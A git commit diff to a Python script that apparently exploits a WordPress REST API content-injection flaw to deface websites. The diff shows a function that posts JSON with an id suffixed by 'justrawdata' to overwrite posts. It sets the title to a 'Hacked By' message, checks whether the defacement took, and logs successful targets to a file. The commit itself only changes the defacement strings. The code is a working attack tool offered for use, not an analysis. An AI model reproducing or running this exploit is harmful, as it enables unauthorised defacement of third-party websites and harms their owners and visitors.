3f7fe6b0b5dedd42fba9238310946045d1338701
AhmadMaZulPahwan7 <38656579+ahmadmazulpahwan7@users.noreply.github.com>
2019-01-07 04:48:37 +0800

    Update ahmad.py

--- ahmad.py
+++ ahmad.py
@@ -11,16 +11,16 @@ def wp_content_injection(url):
              
          my_dict = {}
          my_dict['id'] = str(id)+"justrawdata"
-         my_dict['slug'] = "ws.htm"
+         my_dict['slug'] = "achmad.html"
          my_dict['content'] = "<center><p><b>hacker<br></b></p>"
-         my_dict['title'] = "Hacked By sontoloyo 2"
+         my_dict['title'] = "Hacked By Achmad Gans Dan Kamu Buriq"
          
          path_script = url+'/index.php?p='+str(id)
          post_data = requests.post(path_bug+'/'+str(id), data=json.dumps(my_dict), headers=headers).text
          
          print path_bug+'/'+str(id)
          req_path = requests.get(path_script).text
-         if "sontoloyo 2" in req_path:
+         if "Achmad Gans" in req_path:
            print "[{}+{}] wp-content injection : {}".format(GN, DT, url)
            print "[{}*{}] uploaded at > {}".format(C, DT, path_script)
            opw = open(outpname,'a')
